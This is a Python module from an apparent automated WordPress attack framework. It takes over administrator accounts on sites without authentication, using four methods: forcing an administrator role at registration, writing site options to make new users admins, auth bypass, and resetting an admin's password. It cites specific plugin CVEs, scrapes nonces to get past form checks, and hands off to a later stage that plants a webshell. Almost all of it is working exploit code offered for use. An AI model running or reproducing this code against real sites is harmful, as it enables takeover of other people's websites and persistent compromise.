"""Track B, stage 1 — abuse an unauthenticated flaw to obtain administrator
access, WITHOUT a victim. Four recipe kinds, all fully automatable:

  register-role   : a nopriv registration that honours an attacker role param
                    (e.g. CVE-2026-0920, LA-Studio's lakit_bkrole) → new admin.
  options-update  : arbitrary option write → default_role=administrator +
                    open registration → register lands as admin.
  auth-bypass     : a request that leaves the session authenticated as admin.
  password-reset  : reset a known admin's password to one we choose.

None of these is code execution by itself — each yields an admin *session or
credentials*. Stage 2 (wp_authshell) then plants a webshell. Success is
confirmed downstream by actually logging in / planting, never by trusting the
exploit's HTTP response. Recipe field values are CVE-specific — confirm them
against the PoC (see wp_recipes for the shapes).
"""
import json
import re
import secrets
import string

from . import exploit as _exploit  # reuse the JS-localized nonce scraper


def _strong_password(length=16):
    """A random password that clears the strength gates some registration
    handlers enforce before creating the account (e.g. King Addons
    CVE-2025-6325's Security_Manager::validate_password_strength wants >=8 chars
    and 3-of-4 character classes). A bare hex token clears length but only hits
    two classes, so the account is silently never created and the privesc looks
    like it failed for an unrelated reason. Guarantee 4-of-4 (upper/lower/digit/
    special) so it survives any such gate."""
    specials = "!@#$%^&*"
    pools = [string.ascii_uppercase, string.ascii_lowercase,
             string.digits, specials]
    chars = [secrets.choice(p) for p in pools]           # one from each class
    alphabet = "".join(pools)
    chars += [secrets.choice(alphabet)
              for _ in range(max(length, 12) - len(chars))]
    secrets.SystemRandom().shuffle(chars)                # don't front-load them
    return "".join(chars)


def _random_creds():
    user = "svc_" + secrets.token_hex(4)
    return {"username": user, "email": f"{user}@mail.invalid",
            "password": _strong_password()}


def acquire_admin(base_url, http, recipe, creds=None):
    """Dispatch on recipe['kind']. Returns one of:
      {'username','password'} — caller must log in with these, or
      {'authed': True}        — the session is already an admin, or
      None                    — transport error / unsupported kind."""
    kind = recipe.get("kind", "register-role")
    base = base_url.rstrip("/")
    try:
        if kind in ("register-role", "register-admin"):
            return _register_role(base, http, recipe, creds)
        if kind == "options-update":
            return _options_update(base, http, recipe, creds)
        if kind == "auth-bypass":
            return _auth_bypass(base, http, recipe)
        if kind in ("password-reset", "account-takeover"):
            return _password_reset(base, http, recipe)
    except Exception:
        return None
    return None


def _register_role(base, http, recipe, creds):
    creds = creds or _random_creds()
    fields = dict(recipe.get("extra_params", {}))    # static fields the form requires
    fields[recipe.get("user_field", "user_login")] = creds["username"]
    fields[recipe.get("email_field", "email")] = creds["email"]
    fields[recipe.get("pass_field", "password")] = creds["password"]
    if recipe.get("pass_confirm_field"):
        fields[recipe["pass_confirm_field"]] = creds["password"]
    fields[recipe["role_param"]] = recipe.get("role_value", "administrator")
    envelope = recipe.get("envelope")
    if envelope:
        # Some ajax dispatchers (LA-Studio's lakit_ajax, CVE-2026-0920) batch
        # several sub-actions into one request: the top-level `action` names
        # the DISPATCHER, and the real feature action + its fields are nested
        # as JSON under `actions`: {"<id>": {"action": <subaction>, "data":
        # {...fields...}}}. A nonce for such dispatchers lives at the top
        # level, not inside `data` -- handled below same as the flat case.
        data = {"action": recipe["action"],
                "actions": json.dumps({envelope.get("id", "0"):
                                       {"action": envelope["subaction"], "data": fields}})}
    else:
        data = fields
        data["action"] = recipe["action"]
    # Many real registration handlers require a nonce lifted from the form page.
    # Some print it as a hidden <input> (nonce_from.field); others localize it
    # into a page's JS instead (nonce_from.key, e.g. King Addons CVE-2025-6325's
    # register_nonce inside king_addons_login_register_vars) -- and a plugin
    # localizing several same-keyed nonces in different objects needs
    # nonce_from.object to disambiguate which one (see _harvest_js_nonce).
    nf = recipe.get("nonce_from")
    if nf:
        if nf.get("field"):
            nonce = _harvest_input_nonce(base, http, base + nf["url"], nf["field"])
            param = nf.get("param", nf["field"])
        else:
            nonce = _exploit._harvest_js_nonce(http, base + nf["url"], nf["key"],
                                               object_name=nf.get("object"))
            # A JS-localized nonce may only render on the page that shows the
            # widget (King Addons prints register_nonce solely where the
            # Login|Register widget is placed, never on the front page). When the
            # configured url yields nothing, discover that page via wp-json --
            # otherwise registration is rejected "Security check failed" and no
            # admin is created (the live cve-kingaddons failure mode).
            if not nonce:
                nonce = _exploit._harvest_js_nonce_from_pages(
                    http, base, nf["key"], object_name=nf.get("object"))
            param = nf.get("param", nf["key"])
        if nonce:
            data[param] = nonce
    http.post(base + recipe["endpoint"], data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _harvest_input_nonce(base, http, url, field):
    """Pull a hidden-input nonce value (name/value in either order) off a form
    page. Returns '' if absent — the POST then goes without it (some handlers
    don't enforce it), and VERIFY/login is what proves whether it took."""
    _, page = _fetch_text(http, url)
    for pat in (r'name=["\']' + re.escape(field) + r'["\'][^>]*?value=["\']([^"\']+)',
                r'value=["\']([^"\']+)["\'][^>]*?name=["\']' + re.escape(field) + r'["\']'):
        m = re.search(pat, page)
        if m:
            return m.group(1)
    return ""


def _options_update(base, http, recipe, creds):
    # 1. force open registration + admin default role via the option-write bug
    for opt, val in (recipe.get("set_options") or {}).items():
        payload = dict(recipe.get("params", {}))
        payload[recipe.get("option_name_param", "option")] = opt
        payload[recipe.get("option_value_param", "value")] = val
        http.post(base + recipe["endpoint"], data=payload)
    # 2. register — now lands as the default role we just set (administrator)
    creds = creds or _random_creds()
    reg = recipe.get("register_endpoint", "/wp-login.php?action=register")
    data = {recipe.get("user_field", "user_login"): creds["username"],
            recipe.get("email_field", "user_email"): creds["email"]}
    if recipe.get("pass_field"):
        data[recipe["pass_field"]] = creds["password"]
    http.post(base + reg, data=data)
    return {"username": creds["username"], "password": creds["password"]}


def _auth_bypass(base, http, recipe):
    url = base + recipe["endpoint"]
    if recipe.get("method", "GET").upper() == "POST":
        http.post(url, data=recipe.get("params", {}))
    else:
        http.get(url, params=recipe.get("params", {}))
    # the request is expected to leave the session authenticated as admin
    return {"authed": True}


def _password_reset(base, http, recipe):
    target = recipe.get("target_user", "admin")
    newpw = _random_creds()["password"]
    data = dict(recipe.get("params", {}))
    data[recipe.get("user_param", "user_login")] = target
    data[recipe.get("pass_param", "new_password")] = newpw
    # Some reset forms require the new password twice (EA: eael-pass1/eael-pass2).
    if recipe.get("pass_confirm_param"):
        data[recipe["pass_confirm_param"]] = newpw
    # …and are nonce-gated by a value printed in a page's JS rather than a hidden
    # input (EA CVE-2023-32243: `var localize = {..."nonce":"..."}` on the home
    # page, action 'essential-addons-elementor'). Harvest it when the recipe asks;
    # if absent the POST still goes (a wrong/missing nonce just fails server-side,
    # never a false positive — login/authshell downstream is the real proof).
    nf = recipe.get("nonce_from")
    if nf:
        nonce = _exploit._harvest_js_nonce(http, base + nf.get("url", "/"), nf["key"])
        if nonce:
            data[nf.get("param", nf["key"])] = nonce
    http.post(base + recipe["endpoint"], data=data)
    return {"username": target, "password": newpw}


# WP exposes a REST nonce in-page (wpApiSettings) for logged-out visitors; a
# missing-permission endpoint usually ignores it, but send it when present so
# the recipe also fires on installs that still gate on X-WP-Nonce.
# The key itself may or may not be quoted -- wp_localize_script always emits
# valid JSON ("nonce":"..."), but plugins with hand-rolled inline JS (e.g.
# Kirki's window.wp_kirki = {...}) commonly use a bare object key (nonce:"...")
# instead. \b guards against matching inside a longer identifier (xnonce:).
_REST_NONCE = re.compile(r"""\bnonce["']?\s*:\s*["']([A-Za-z0-9]{6,})["']""")


def _harvest_rest_nonce(base, http, recipe):
    """Best-effort REST nonce. A static recipe['nonce'] wins; otherwise scrape
    one from a page (default home). Returns '' when none is found — the caller
    simply omits the header, which is correct for a truly public endpoint."""
    if recipe.get("nonce"):
        return recipe["nonce"]
    _, page = _fetch_text(http, base + recipe.get("nonce_url", "/"))
    m = _REST_NONCE.search(page)
    return m.group(1) if m else ""


def _fetch_text(http, url):
    try:
        r = http.get(url)
        return getattr(r, "status_code", 0), (getattr(r, "text", "") or "")
    except Exception:
        return 0, ""
